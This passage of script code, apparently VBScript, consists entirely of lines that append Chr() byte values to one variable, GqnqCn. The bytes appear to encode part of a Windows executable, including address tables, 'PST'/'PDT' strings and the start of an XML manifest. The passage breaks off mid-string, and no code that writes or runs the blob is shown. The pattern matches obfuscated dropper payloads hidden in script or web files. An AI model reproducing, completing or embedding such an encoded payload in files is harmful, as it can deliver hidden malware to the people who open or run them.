GqnqCn=GqnqCn&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(16)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(97)&Chr(98)&Chr(99)&Chr(100)&Chr(101)&Chr(102)&Chr(103)&Chr(104)&Chr(105)&Chr(106)&Chr(107)&Chr(108)&Chr(109)&Chr(110)&Chr(111)&Chr(112)&Chr(113)&Chr(114)&Chr(115)&Chr(116)&Chr(117)&Chr(118)&Chr(119)&Chr(120)&Chr(121)&Chr(122)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(66)&Chr(67)&Chr(68)&Chr(69)&Chr(70)&Chr(71)&Chr(72)&Chr(73)&Chr(74)&Chr(75)
GqnqCn=GqnqCn&Chr(76)&Chr(77)&Chr(78)&Chr(79)&Chr(80)&Chr(81)&Chr(82)&Chr(83)&Chr(84)&Chr(85)&Chr(86)&Chr(87)&Chr(88)&Chr(89)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(1)&Chr(2)&Chr(4)&Chr(8)&Chr(164)&Chr(3)&Chr(0)&Chr(0)&Chr(96)&Chr(130)&Chr(121)&Chr(130)&Chr(33)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(166)&Chr(223)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(161)&Chr(165)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(159)&Chr(224)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(126)&Chr(128)&Chr(252)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(168)&Chr(3)&Chr(0)&Chr(0)&Chr(193)&Chr(163)&Chr(218)&Chr(163)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(181)&Chr(3)&Chr(0)&Chr(0)&Chr(193)&Chr(163)&Chr(218)&Chr(163)&Chr(32)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(182)&Chr(3)&Chr(0)&Chr(0)&Chr(207)&Chr(162)&Chr(228)&Chr(162)&Chr(26)&Chr(0)&Chr(229)&Chr(162)&Chr(232)&Chr(162)&Chr(91)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(64)&Chr(126)&Chr(161)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(81)&Chr(5)&Chr(0)&Chr(0)&Chr(81)&Chr(218)&Chr(94)&Chr(218)&Chr(32)&Chr(0)&Chr(95)&Chr(218)&Chr(106)&Chr(218)&Chr(50)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(129)&Chr(211)&Chr(216)&Chr(222)&Chr(224)&Chr(249)&Chr(0)&Chr(0)&Chr(49)&Chr(126)&Chr(129)&Chr(254)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(236)&Chr(139)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(67)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(8)&Chr(169)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(137)&Chr(64)&Chr(0)&Chr(112)&Chr(142)&Chr(64)&Chr(0)&Chr(240)&Chr(143)&Chr(64)&Chr(0)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(169)&Chr(64)&Chr(0)&Chr(224)&Chr(163)&Chr(64)&Chr(0)&Chr(78)&Chr(230)&Chr(64)&Chr(187)&Chr(177)&Chr(25)&Chr(191)&Chr(68)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(137)&Chr(64)&Chr(0)&Chr(234)&Chr(139)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(146)&Chr(64)&Chr(0)&Chr(20)&Chr(146)&Chr(64)&Chr(0)&Chr(16)&Chr(146)&Chr(64)&Chr(0)&Chr(12)&Chr(146)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(8)&Chr(146)&Chr(64)&Chr(0)&Chr(4)&Chr(146)&Chr(64)&Chr(0)&Chr(0)&Chr(146)&Chr(64)&Chr(0)&Chr(248)&Chr(145)&Chr(64)&Chr(0)&Chr(240)&Chr(145)&Chr(64)&Chr(0)&Chr(232)&Chr(145)&Chr(64)&Chr(0)&Chr(220)&Chr(145)&Chr(64)&Chr(0)&Chr(208)&Chr(145)&Chr(64)&Chr(0)&Chr(200)&Chr(145)&Chr(64)&Chr(0)&Chr(188)&Chr(145)&Chr(64)&Chr(0)&Chr(184)&Chr(145)&Chr(64)&Chr(0)&Chr(180)&Chr(145)&Chr(64)&Chr(0)&Chr(176)&Chr(145)&Chr(64)&Chr(0)&Chr(172)&Chr(145)&Chr(64)&Chr(0)&Chr(168)&Chr(145)&Chr(64)&Chr(0)&Chr(164)&Chr(145)&Chr(64)&Chr(0)&Chr(160)&Chr(145)&Chr(64)&Chr(0)&Chr(156)&Chr(145)&Chr(64)&Chr(0)&Chr(152)&Chr(145)&Chr(64)&Chr(0)&Chr(148)&Chr(145)&Chr(64)&Chr(0)&Chr(144)&Chr(145)&Chr(64)&Chr(0)&Chr(140)&Chr(145)&Chr(64)&Chr(0)&Chr(132)&Chr(145)&Chr(64)&Chr(0)&Chr(120)&Chr(145)&Chr(64)&Chr(0)&Chr(112)&Chr(145)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(104)&Chr(145)&Chr(64)&Chr(0)&Chr(168)&Chr(145)&Chr(64)&Chr(0)&Chr(96)&Chr(145)&Chr(64)&Chr(0)&Chr(88)&Chr(145)&Chr(64)&Chr(0)&Chr(80)&Chr(145)&Chr(64)&Chr(0)&Chr(68)&Chr(145)&Chr(64)&Chr(0)&Chr(60)&Chr(145)&Chr(64)&Chr(0)&Chr(48)&Chr(145)&Chr(64)&Chr(0)&Chr(36)&Chr(145)&Chr(64)&Chr(0)&Chr(32)&Chr(145)&Chr(64)&Chr(0)&Chr(28)&Chr(145)&Chr(64)&Chr(0)&Chr(16)&Chr(145)&Chr(64)&Chr(0)&Chr(252)&Chr(144)&Chr(64)&Chr(0)&Chr(240)&Chr(144)&Chr(64)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(170)&Chr(64)&Chr(0)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(220)&Chr(170)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)
GqnqCn=GqnqCn&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(196)&Chr(178)&Chr(64)&Chr(0)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(127)&Chr(224)&Chr(170)&Chr(64)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(5)&Chr(147)&Chr(25)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(112)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(240)&Chr(241)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(83)&Chr(84)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(68)&Chr(84)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(64)&Chr(171)&Chr(64)&Chr(0)&Chr(128)&Chr(171)&Chr(64)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(0)&Chr(0)&Chr(0)&Chr(90)&Chr(0)&Chr(0)&Chr(0)&Chr(120)&Chr(0)&Chr(0)&Chr(0)&Chr(151)&Chr(0)&Chr(0)&Chr(0)&Chr(181)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(0)&Chr(0)&Chr(0)&Chr(243)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(1)&Chr(0)&Chr(0)&Chr(48)&Chr(1)&Chr(0)&Chr(0)&Chr(78)&Chr(1)&Chr(0)&Chr(0)&Chr(109)&Chr(1)&Chr(0)&Chr(0)&Chr(255)&Chr(255)&Chr(255)&Chr(255)&Chr(30)&Chr(0)&Chr(0)&Chr(0)&Chr(58)&Chr(0)&Chr(0)&Chr(0)&Chr(89)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(119)&Chr(0)&Chr(0)&Chr(0)&Chr(150)&Chr(0)&Chr(0)&Chr(0)&Chr(180)&Chr(0)&Chr(0)&Chr(0)&Chr(211)&Chr(0)&Chr(0)&Chr(0)&Chr(242)&Chr(0)&Chr(0)&Chr(0)&Chr(16)&Chr(1)&Chr(0)&Chr(0)&Chr(47)&Chr(1)&Chr(0)&Chr(0)&Chr(77)&Chr(1)&Chr(0)&Chr(0)&Chr(108)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(0)&Chr(24)&Chr(0)&Chr(0)&Chr(128)
GqnqCn=GqnqCn&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(48)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(0)&Chr(9)&Chr(4)&Chr(0)&Chr(0)&Chr(72)&Chr(0)&Chr(0)&Chr(0)&Chr(88)&Chr(192)&Chr(0)&Chr(0)&Chr(90)&Chr(1)&Chr(0)&Chr(0)&Chr(228)&Chr(4)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(60)&Chr(97)&Chr(115)&Chr(115)&Chr(101)&Chr(109)&Chr(98)&Chr(108)&Chr(121)&Chr(32)&Chr(120)&Chr(109)&Chr(108)&Chr(110)&Chr(115)&Chr(61)&Chr(34)&Chr(117)&Chr(114)&Chr(110)&Chr(58)&Chr(115)&Chr(99)&Chr(104)&Chr(101)&Chr(109)&Chr(97)&Chr(115)&Chr(45)&Chr(109)&Chr(105)&Chr(99)&Chr(114)&Chr(111)&Chr(115)&Chr(111)
